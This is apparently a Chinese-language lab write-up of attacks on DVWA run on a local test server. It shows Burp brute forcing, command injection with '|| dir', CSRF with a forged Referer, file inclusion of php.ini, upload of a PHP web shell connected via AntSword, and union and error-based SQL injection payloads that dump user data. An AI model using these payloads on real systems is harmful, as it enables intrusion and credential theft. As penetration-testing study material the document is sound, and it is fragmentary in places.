...
![[Pasted image 20250318235354.png]](./assets/Pasted%20image%2020250318235354.png)
输入错误密码，会有bp截包history
![[Pasted image 20250318235531.png]](./assets/Pasted%20image%2020250318235531.png)
右键进入intruder,然后attack type这里选择sniper

![[Pasted image 20250318235802.png]](./assets/Pasted%20image%2020250318235802.png)
payload这里选择导入密码本，
这里为了加快进度自己最简单写了一个pwd.txt这种
![[Pasted image 20250319000037.png]](./assets/Pasted%20image%2020250319000037.png)
导入之后就可以直接start attack
之后就可以看到一些信息了，分析为暴力破解成功。可以看到正确登陆成功的与其他失败的有所不同。
![[Pasted image 20250319000248.png]](./assets/Pasted%20image%2020250319000248.png)

## 2.命令注入
可以通过直接ping 一下本地获得信息
![[Pasted image 20250319181654.png]](./assets/Pasted%20image%2020250319181654.png)
在设置等级为low时
...
然后在命令行中就可以看到信息了
![[Pasted image 20250319182422.png]](./assets/Pasted%20image%2020250319182422.png)
还可以在ping 完成之后ipconfig查看信息
![[Pasted image 20250319182532.png]](./assets/Pasted%20image%2020250319182532.png)
...
分别输入http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=111&password_conf=1234&Change=Change#
![[Pasted image 20250319110842.png]](./assets/Pasted%20image%2020250319110842.png)
和http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#
![[Pasted image 20250319111002.png]](./assets/Pasted%20image%2020250319111002.png)
...
我们随便抓一个包，然后bp抓包看看
![[Pasted image 20250319211044.png]](./assets/Pasted%20image%2020250319211044.png)
可以发现Referer字段
如果直接输出URL的时候，尝试修改密码并不能成功，是因为没有包含referer
所以自己可以加一个referer,伪造请求
在bp的repeater中查看request,在referer中构造加入本地地址，然后send可以伪造出请求.如下图
![[Pasted image 20250319211419.png]](./assets/Pasted%20image%2020250319211419.png)
...
![[Pasted image 20250319214339.png]](./assets/Pasted%20image%2020250319214339.png)
以上可知：通过page=xxx来打开相应的文件
尝试包含一个不存在的本地文件nihao.php,提示error
![[Pasted image 20250320151251.png]](./assets/Pasted%20image%2020250320151251.png)说明服务器类型不是linux
![[Pasted image 20250320151411.png]](./assets/Pasted%20image%2020250320151411.png)
同理尝试/etc/shadow,报错，说明不是linux
通过上述路径可以发现服务器的绝对路径就是 C:\PhpStudy\phpstudy_pro\WWW\
![[Pasted image 20250320154300.png]](./assets/Pasted%20image%2020250320154300.png)
...
可以发现可以看到php.ini
![[Pasted image 20250320201217.png]](./assets/Pasted%20image%2020250320201217.png)
...
![[Pasted image 20250320201516.png]](./assets/Pasted%20image%2020250320201516.png)
...
![[Pasted image 20250320202523.png]](./assets/Pasted%20image%2020250320202523.png)
在command injection中执行那个|| dir C:\PhpStudy\phpstudy_pro\WWW,可以看到刚写的muma.php
![[Pasted image 20250320202839.png]](./assets/Pasted%20image%2020250320202839.png)

尝试用中国菜刀未果，好像软件有问题，
后用中国蚁剑成功，构造添加数据，如下图：
![[Pasted image 20250320211929.png]](./assets/Pasted%20image%2020250320211929.png)
相应密码为key,选择连接类型为php.
然后测试连接成功。可以成功进入文件列表
![[Pasted image 20250320212148.png]](./assets/Pasted%20image%2020250320212148.png)
...
![[Pasted image 20250320214306.png]](./assets/Pasted%20image%2020250320214306.png)
可以在C:\PhpStudy\phpstudy_pro\WWW\DVWA-master\hackable\uploads 中看到上传到的.jpeg的文件
![[Pasted image 20250321105637.png]](./assets/Pasted%20image%2020250321105637.png)
然后在bp中抓包中找到Content-Disposition字段，然后修改为muma.php,forword就可以看到web的response
![[Pasted image 20250321110618.png]](./assets/Pasted%20image%2020250321110618.png)
然后就可以在本地的uploads中找到上传成功的muma.php
![[Pasted image 20250321110702.png]](./assets/Pasted%20image%2020250321110618.png)
接着跟上面的一样用一句话木马进行连接，实现服务器文件管理
![[Pasted image 20250321111150.png]](./assets/Pasted%20image%2020250321111150.png)
连接成功，进入文件管理：
![[Pasted image 20250321111229.png]](./assets/Pasted%20image%2020250321111229.png)

## 6.SQL注入

### SQL injection -low
正常提交payload为1
![[Pasted image 20250321155552.png]](./assets/Pasted%20image%2020250321155552.png)
联合查询：
```
1 and 1=1#
1 and 1=2#
```
均返回正常
![[Pasted image 20250321155835.png]](./assets/Pasted%20image%2020250321155835.png)
得出结论：
注入类型不是数字
```
1' and 1=1#     //返回正常
...
1' order by 3#     //返回失败
![[Pasted image 20250321171019.png]](./assets/Pasted%20image%2020250321155835.png)
...
```
![[Pasted image 20250321171226.png]](./assets/Pasted%20image%2020250321171226.png)
可以看到数据库为dvwa
`1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'#`
查询表名
![[Pasted image 20250321172230.png]](./assets/Pasted%20image%2020250321172230.png)
...
```
![[Pasted image 20250321174342.png]](./assets/Pasted%20image%2020250321174342.png)
可以看到列名：password,user_id,first-id,last_name等等

获取数据：1'`` UNION SELECT 1,group_concat(user,0x3a,avatar) from users#  


![[Pasted image 20250321193059.png]](./assets/Pasted%20image%2020250321193059.png)
可以知道
...
获取表名，如下图
![[Pasted image 20250321193746.png]](./assets/Pasted%20image%2020250321193746.png)
获取列名
...
![[Pasted image 20250321193842.png]](./assets/Pasted%20image%2020250321193746.png)
获取数据
`1' and updatexml(1,concat(0x7e,(SELECT group_concat(user,0x3a,avatar) from users limit 0,1),0x7e),1)#`
![[Pasted image 20250321194005.png]](./assets/Pasted%20image%2020250321194005.png)


### SQL injection -middle
![[Pasted image 20250321194959.png]](./assets/Pasted%20image%2020250321194005.png)

这个时候URL没有参数，可能只能以post的方式查看注入结果
掏出bp
先把上面那个id=1的post方式截个包
![[Pasted image 20250321195342.png]](./assets/Pasted%20image%2020250321195342.png)
以repeater的方式，`post id=1 and 1=1#`
如下图，reponse 说明正常
![[Pasted image 20250321200026.png]](./assets/Pasted%20image%2020250321200026.png)
`post id= 1 and 1=2#` 
异常，说明是注入类型为数字。这里跟上面同理不作展示
#### 获取数据库：
payload 如下
![[Pasted image 20250321200531.png]](./assets/Pasted%20image%2020250321200531.png)

获取表名，出错
![[Pasted image 20250321200728.png]](./assets/Pasted%20image%2020250321200728.png)
...
![[Pasted image 20250321201433.png]](./assets/Pasted%20image%2020250321201433.png)

#### error 注入
注入命令同low,
![[Pasted image 20250321202126.png]](./assets/Pasted%20image%2020250321202126.png)
#### 总结
分析middle.php
##### **代码功能概述**
